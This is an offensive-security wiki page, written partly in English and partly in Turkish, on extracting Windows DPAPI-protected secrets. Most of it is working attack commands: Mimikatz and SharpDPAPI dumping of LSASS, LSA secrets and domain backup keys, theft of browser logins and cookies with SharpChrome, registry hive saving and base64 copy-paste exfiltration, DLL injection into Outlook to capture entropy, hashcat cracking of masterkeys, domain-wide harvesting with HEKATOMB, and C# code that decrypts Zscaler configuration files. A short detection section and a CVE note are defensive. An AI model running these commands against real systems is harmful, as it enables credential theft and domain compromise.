# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## What is DPAPI

The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.

The most common way to use DPAPI is through the **`CryptProtectData` and `CryptUnprotectData`** functions, which allow applications to encrypt and decrypt data securely with the session of the process that is currently logged on. This means that the encrypted data can only be decrypted by the same user or system that encrypted it.

Moreover, these functions accepts also an **`entropy` parameter** which will also be used during encryption and decryption, therefore, in order to decrypt something encrypted using this parameter, you must provide the same entropy value that was used during encryption.

### Users key generation

DPAPI, her kullanıcı için kimlik bilgilerine dayalı olarak benzersiz bir anahtar (called **`pre-key`**) oluşturur. Bu anahtar kullanıcının parolasından ve diğer faktörlerden türetilir ve algoritma kullanıcı türüne bağlıdır ancak sonuçta bir SHA1 olur. Örneğin, domain kullanıcıları için **it depends on the NTLM hash of the user**.

Bu özellikle ilginçtir çünkü bir saldırgan kullanıcının parola hash'ini elde edebilirse:

- **Decrypt any data that was encrypted using DPAPI** with that user's key without needing to contact any API
- Try to **crack the password** offline trying to generate the valid DPAPI key

Ayrıca, bir kullanıcı DPAPI kullanarak veri şifrelediğinde her seferinde yeni bir **master key** oluşturulur. Bu master key, veriyi gerçekten şifrelemek için kullanılan anahtardır. Her master key'e onu tanımlayan bir **GUID** atanır.

Master key'ler **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** dizininde saklanır; burada `{SID}` o kullanıcının Security Identifier'ıdır. Master key, kullanıcının **`pre-key`**'i tarafından ve kurtarma için bir **domain backup key** tarafından şifrelenmiş olarak saklanır (yani aynı anahtar iki farklı yolla iki kere şifrelenmiş olur).

Not: Master key'i şifrelemek için kullanılan **domain key** etki alanı denetleyicilerinde bulunur ve asla değişmez; bu yüzden bir saldırgan domain controller'a erişimi varsa domain backup key'i alıp tüm domain kullanıcılarının master key'lerini çözebilir.

Şifrelenmiş blob'lar, başlıklarında veriyi şifrelemek için kullanılan **master key'in GUID**'ini içerir.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Makine/Sistem anahtar üretimi

Bu, makinenin veriyi şifrelemek için kullandığı anahtardır. **DPAPI_SYSTEM LSA secret**'e dayanır; bu, yalnızca SYSTEM kullanıcısının erişebildiği özel bir anahtardır. Bu anahtar, makine düzeyindeki kimlik bilgileri veya sistem genelindeki gizli veriler gibi, sistemin kendisi tarafından erişilmesi gereken verileri şifrelemek için kullanılır.

Bu anahtarların **domain yedeği yoktur**, bu yüzden yalnızca yerel olarak erişilebilirler:

- **Mimikatz**, LSA secret'lerini dump'layarak şu komutla erişebilir: `mimikatz lsadump::secrets`
- Gizli değer kayıt defterinde saklanır, bu yüzden bir yönetici erişim için **DACL izinlerini değiştirebilir**. Kayıt yolu: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Kayıt defteri hives'lerinden çevrimdışı çıkarım da mümkündür. Örneğin, hedefte yönetici olarak hives'leri kaydedip exfiltrate edebilirsiniz:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Ardından analiz kutunuzda, hive'lerden DPAPI_SYSTEM LSA secret'ini kurtarın ve bunu makine kapsamındaki blob'ların (zamanlanmış görev parolaları, servis kimlik bilgileri, Wi‑Fi profilleri vb.) şifresini çözmek için kullanın:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI tarafından korunan veriler

Arasında DPAPI tarafından korunan kişisel veriler şunlardır:

- Windows creds
- Internet Explorer ve Google Chrome'un parolaları ve otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamalar için e-posta ve dahili FTP hesap parolaları
- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için parolalar, şifreleme anahtarları dahil
- Uzaktan masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme ve kimlik doğrulama amaçları için özel anahtarlar
- Credential Manager tarafından yönetilen ağ parolaları ve CryptProtectData kullanan uygulamalardaki kişisel veriler (ör. Skype, MSN messenger vb.)
- Kayıt defterindeki şifrelenmiş blob'lar
- ...

Sistem tarafından korunan veriler şunları içerir:
- Wifi parolaları
- Zamanlanmış görev parolaları
- ...

### Master key çıkarma seçenekleri

- Eğer kullanıcı domain admin ayrıcalıklarına sahipse, etki alanındaki tüm kullanıcı master key'lerini çözmek için **domain backup key**'e erişebilir:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Yerel yönetici ayrıcalıklarıyla, bağlı tüm kullanıcıların DPAPI master keys'lerini ve SYSTEM key'ini çıkarmak için **LSASS memory**'e erişmek mümkündür.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Eğer kullanıcı yerel admin ayrıcalıklarına sahipse, **DPAPI_SYSTEM LSA secret**'e erişerek makinenin master anahtarlarını çözebilir:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Eğer kullanıcının password veya NTLM hash'i biliniyorsa, kullanıcıya ait master keys'i doğrudan **decrypt** edebilirsiniz:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Eğer kullanıcı olarak bir session içindeyseniz, DC'den **backup key to decrypt the master keys using RPC** istemek mümkündür. Eğer local admin iseniz ve kullanıcı logged in ise, bunun için **steal his session token** yapabilirsiniz:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault'ları Listele
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI Şifrelenmiş Verilere Erişim

### DPAPI Şifrelenmiş verileri bul

Kullanıcıların yaygın olarak **korunan dosyaları** şunlardadır:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Check also changing `\Roaming\` to `\Local\` in the above paths.

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) file system, registry ve B64 blobs içinde DPAPI encrypted blobs bulabilir:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Şunu unutmayın ki [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aynı repo'dan) DPAPI kullanarak cookies gibi hassas verilerin şifresini çözmek için kullanılabilir.

#### Chromium/Edge/Electron quick recipes (SharpChrome)

- Mevcut kullanıcı, kaydedilmiş logins/cookies'in etkileşimli şifre çözümü (Chrome 127+ app-bound cookies ile bile çalışır çünkü ek anahtar, kullanıcı bağlamında çalıştırılırken kullanıcının Credential Manager'ından çözülür):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Sadece dosyalar varken çevrimdışı analiz. Önce profilin "Local State" dosyasından AES state key'i çıkarın ve ardından cookie DB'nin şifresini çözmek için kullanın:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI domain backup key (PVK) ve hedef hostta admin olduğunuzda domain genelinde/uzaktan triage:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Eğer bir kullanıcının DPAPI prekey/credkey (LSASS'tan) varsa, password cracking'i atlayıp profil verilerini doğrudan decrypt edebilirsiniz:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notlar
- Daha yeni Chrome/Edge sürümleri bazı çerezleri "App-Bound" şifreleme kullanarak depolayabilir. Bu belirli çerezlerin çevrimdışı şifre çözümü, ek app-bound key olmadan mümkün değildir; otomatik olarak almak için SharpChrome'u hedef kullanıcı bağlamında çalıştırın. Aşağıda referans verilen Chrome güvenlik blog yazısına bakın.

### Erişim anahtarları ve veriler

- **SharpDPAPI'yi kullanın** mevcut oturumdan DPAPI ile şifrelenmiş dosyalardan kimlik bilgilerini almak için:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kimlik bilgileriyle ilgili bilgi alın**, örneğin şifrelenmiş veri ve guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **masterkeys'e erişim**:

RPC kullanarak **domain backup key** isteyen bir kullanıcının masterkey'ini çöz:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Bu **SharpDPAPI** aracı ayrıca masterkey şifresinin çözülmesi için şu argümanları destekler ( `/rpc` kullanılarak etki alanının yedek anahtarının alınabileceğine, `/password` ile düz metin bir şifrenin kullanılabileceğine veya `/pvk` ile bir DPAPI etki alanı özel anahtar dosyasının belirtilebileceğine dikkat edin...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrypt data using a masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** aracı ayrıca `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme için bu argümanları destekler (örneğin `/rpc` ile etki alanının yedekleme anahtarını almak, `/password` ile düz metin parolayı kullanmak, `/pvk` ile bir DPAPI etki alanı özel anahtar dosyası belirtmek, `/unprotect` ile geçerli kullanıcının oturumunu kullanmak mümkün...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Doğrudan bir DPAPI prekey/credkey kullanma (şifre gerekmez)

Eğer LSASS'i dump edebiliyorsanız, Mimikatz genellikle bir per-logon DPAPI key ortaya çıkarır; bu anahtar, kullanıcının masterkeys'lerini plaintext password'u bilmeden decrypt etmek için kullanılabilir. Bu değeri doğrudan tooling'e verin:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **Mevcut kullanıcı oturumunu** kullanarak bazı verilerin şifresini çöz:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py ile çevrimdışı şifre çözme

Hedef kullanıcının SID'ine ve parolasına (veya NT hash'ine) sahipseniz, DPAPI masterkey'lerini ve Credential Manager blob'larını tamamen çevrimdışı olarak Impacket dpapi.py ile çözebilirsiniz.

- Diskteki artefaktları belirleyin:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Dosya transfer araçları güvenilmezse, dosyaları host üzerinde base64 ile kodlayıp çıktıyı kopyalayın:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Kullanıcının SID'i ve password/hash'i ile masterkey'i decrypt et:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Şifresi çözülmüş masterkey'i kullanarak credential blob'u deşifre edin:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Bu iş akışı, Windows Credential Manager kullanan uygulamalar tarafından kaydedilmiş etki alanı kimlik bilgilerini sıklıkla kurtarır; buna yönetici hesaplar (ör., `*_adm`) da dahildir.

---

### Opsiyonel Entropinin İşlenmesi ("Üçüncü taraf entropisi")

Bazı uygulamalar `CryptProtectData`'a ek bir **entropy** değeri gönderir. Bu değer olmadan, doğru masterkey bilinse bile blob çözülemez. Bu nedenle entropinin elde edilmesi, bu yolla korunmuş kimlik bilgilerini hedeflerken (ör. Microsoft Outlook, bazı VPN istemcileri) elzemdir.

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) hedef süreç içindeki DPAPI fonksiyonlarına hook yapan bir user-mode DLL'dir ve sağlanan herhangi bir opsiyonel entropiyi şeffaf şekilde kaydeder. EntropyCapture'ı **DLL-injection** modunda `outlook.exe` veya `vpnclient.exe` gibi süreçlere karşı çalıştırmak, her entropi tamponunu çağıran süreç ve blob ile eşleyen bir dosya üretecektir. Yakalanan entropi daha sonra veriyi çözmek için **SharpDPAPI** (`/entropy:`) veya **Mimikatz** (`/entropy:<file>`)'e sağlanabilir.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Masterkey'leri çevrimdışı kırma (Hashcat & DPAPISnoop)

Microsoft, Windows 10 v1607 (2016) ile başlayan sürümlerde **context 3** masterkey formatını tanıttı. `hashcat` v6.2.6 (Aralık 2023), masterkey dosyasından kullanıcı şifrelerinin doğrudan GPU hızlandırmalı kırılmasına izin veren hash-modları **22100** (DPAPI masterkey v1 context), **22101** (context 1) ve **22102** (context 3) ekledi. Bu sayede saldırganlar hedef sistemle etkileşime girmeden wordlist veya brute-force saldırıları gerçekleştirebilir.

`DPAPISnoop` (2024) süreci otomatikleştirir:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Araç ayrıca Credential ve Vault blob'larını parse edip, kırılmış anahtarlarla decrypt ederek cleartext parolaları export edebilir.

### Diğer makine verilerine erişim

Uzak bir makinenin verilerine erişmek için **SharpDPAPI ve SharpChrome** içinde **`/server:HOST`** seçeneğini kullanabilirsiniz. Elbette o makineye erişebilmeniz gerekir ve aşağıdaki örnekte **domain backup encryption key is known** varsayılmaktadır:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Diğer araçlar

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) LDAP dizininden tüm kullanıcıların ve bilgisayarların çıkarılmasını ve RPC üzerinden domain denetleyicisinin yedek anahtarının çıkarılmasını otomatikleştiren bir araçtır. Script daha sonra tüm bilgisayarların IP adreslerini çözecek ve smbclient ile tüm bilgisayarlarda tüm kullanıcıların DPAPI blob'larını alıp domain yedek anahtarı ile her şeyi şifre çözecektir.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'tan çıkarılmış bilgisayar listesiyle, bilmeseniz bile her alt ağı bulabilirsiniz!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) DPAPI ile korunan sırları otomatik olarak dökebilir. 2.x sürümü şunları getirdi:

* Yüzlerce hosttan blob'ların paralel toplanması
* **context 3** masterkey'lerinin parse edilmesi ve Hashcat ile otomatik kırma entegrasyonu
* Chrome "App-Bound" şifreli çerezleri için destek (bkz. sonraki bölüm)
* Yeni bir **`--snapshot`** modu; endpoint'leri tekrarlı olarak sorgulayıp yeni oluşturulan blob'larda diff alır

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault dosyaları için bir C# parser'ıdır; Hashcat/JtR formatları üretebilir ve isteğe bağlı olarak kırmayı otomatik başlatabilir. Windows 11 24H1'e kadar hem machine hem de user masterkey formatlarını tam olarak destekler.


## Yaygın tespitler

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve diğer DPAPI ile ilişkili dizinlerdeki dosyalara erişim.
- Özellikle **C$** veya **ADMIN$** gibi bir ağ paylaşımından.
- LSASS belleğine erişmek veya masterkey'leri dökmek için **Mimikatz**, **SharpDPAPI** veya benzeri araçların kullanılması.
- Etkinlik **4662**: *An operation was performed on an object* – bu, **`BCKUPKEY`** nesnesine erişim ile ilişkilendirilebilir.
- Etkinlik **4673/4674** – bir süreç *SeTrustedCredManAccessPrivilege* (Credential Manager) talep ettiğinde


---
### 2023-2025 güvenlik açıkları & ekosistem değişiklikleri

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Kasım 2023). Ağ erişimi olan bir saldırgan, bir domain üyesini kötü niyetli bir DPAPI yedek anahtarını aldıracak şekilde kandırabilir; bu da kullanıcı masterkey'lerinin şifre çözülmesine olanak verir. Kasım 2023 toplu güncellemesinde yamalandı – yöneticiler DC'lerin ve iş istasyonlarının tamamen güncel olduğundan emin olmalıdır.
* **Chrome 127 “App-Bound” cookie encryption** (Temmuz 2024) eski yalnızca DPAPI korumasını, kullanıcının **Credential Manager** altında saklanan ek bir anahtar ile değiştirdi. Çerezlerin çevrimdışı şifre çözümü artık hem DPAPI masterkey hem de **GCM-wrapped app-bound key** gerektiriyor. SharpChrome v2.3 ve DonPAPI 2.x, kullanıcı bağlamında çalıştırıldıklarında ekstra anahtarı kurtarabilirler.


### Vaka İncelemesi: Zscaler Client Connector – SID'den türetilen özel entropi

Zscaler Client Connector `C:\ProgramData\Zscaler` altında birkaç yapılandırma dosyası saklar (örn. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her dosya **DPAPI (Machine scope)** ile şifrelenmiştir ancak satıcı, diske kaydedilmek yerine *çalışma zamanında hesaplanan* **custom entropy** sağlar.

Entropi iki öğeden yeniden oluşturulur:

1. `ZSACredentialProvider.dll` içine gömülmüş hard-coded bir gizli değer.
2. Yapılandırmanın ait olduğu Windows hesabının **SID**'i.

DLL tarafından uygulanan algoritma eşdeğerdir:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Gizli veri diskte okunabilen bir DLL'e gömülü olduğundan, **SYSTEM yetkisine sahip herhangi bir yerel saldırgan herhangi bir SID için entropiyi yeniden üretebilir** ve blob'ları çevrimdışı olarak çözebilir:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Şifre çözme, her bir **device posture check** ve beklenen değeri de içeren eksiksiz JSON yapılandırmasını verir — bu bilgiler, client-side bypasses girişimlerinde çok değerlidir.

> TIP: diğer şifrelenmiş artefaktlar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI ile **entropy olmadan** (`16` sıfır byte) korunur. Bu nedenle SYSTEM ayrıcalıkları elde edildiğinde `ProtectedData.Unprotect` ile doğrudan çözülebilirler.

## Kaynaklar

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
